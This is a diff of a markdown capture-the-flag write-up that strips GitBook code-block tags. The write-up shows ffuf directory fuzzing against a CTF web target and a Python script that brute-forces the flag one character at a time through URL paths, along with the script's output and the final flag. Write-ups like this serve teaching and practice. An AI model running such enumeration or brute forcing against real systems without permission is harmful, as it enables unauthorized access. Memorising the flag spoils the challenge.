@@ -32,7 +32,6 @@ If we try to visit a non-existing page, e.g. `/admin` it says `Wrong way!`
 
 You could use many tools, e.g. `gobuster` or `burp`. I'll use `ffuf` and check for PHP/JS file extensions, filtering out responses that contain the word "Wrong" (invalid)
 
-{% code overflow="wrap" %}
 ```bash
 ffuf -c -u https://buster.ctf.zone/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.js -fr Wrong
 
@@ -45,7 +44,6 @@ flag                    [Status: 200, Size: 1932, Words: 527, Lines: 53, Duratio
 images                  [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 28ms]
 server-status           [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 27ms]
 ```
-{% endcode %}
 
 Notice that we have `/f`, `/fla`, `/flag` all showing 200 OK with the same response length. If we try to access `/flag{` it is also a 200 OK, but `/flag}` is not.
 
@@ -53,7 +51,6 @@ What does that tell us? The flag _is_ the path! We can brute force each characte
 
 I used ChatGPT to make a quick PoC. The server was super slow with lots of timeouts, so some logic was needed to repeat chars where needed.
 
-{% code overflow="wrap" %}
 ```python
 import requests
 import string
@@ -97,11 +94,9 @@ while not flag.endswith("}"):
 
 print(f"[+] Final flag: {flag}")
 ```
-{% endcode %}
 
 We run the script and see it working as expected.
 
-{% code overflow="wrap" %}
 ```bash
 python poc.py
 
@@ -124,15 +119,12 @@ Current flag: flag{dec
 [+] Found char 'a' at position 8 -> flag{deca
 Current flag: flag{deca
 ```
-{% endcode %}
 
 Let it finish and we'll receive the flag.
 
-{% code overflow="wrap" %}
 ```bash
 [+] Found char '}' at position 37 -> flag{deca3b962fc316a6d69a7e0c2c33c7fa}
 [+] Final flag: flag{deca3b962fc316a6d69a7e0c2c33c7fa}
 ```
-{% endcode %}
 
 Flag: `flag{deca3b962fc316a6d69a7e0c2c33c7fa}`
